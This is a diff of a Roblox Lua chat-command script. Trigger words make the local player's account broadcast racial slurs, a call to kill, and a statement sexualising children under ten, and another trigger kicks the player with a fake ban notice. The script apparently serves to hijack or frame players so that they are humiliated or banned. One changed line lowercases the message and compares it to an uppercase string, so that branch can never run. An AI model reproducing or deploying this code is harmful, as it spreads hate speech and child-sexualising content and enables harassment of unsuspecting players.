@@ -7,9 +7,11 @@ local function onChatMessage(message, speaker)
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GOD I HATE THESE FUCKING MONKEYS", "All")
     elseif message == "Ax4" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EVERYONE KILL THESE NIGGERS", "All")
-    elseif message == "Tempuban" then
+    elseif message == "TCHAT" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Test Chat Works", "All")
+    elseif message == "PBAN" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
-    elseif message:lower() == "PBAN" then
+    elseif message:lower() == "TBAN" then
         -- Kick the local player
         game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
     end
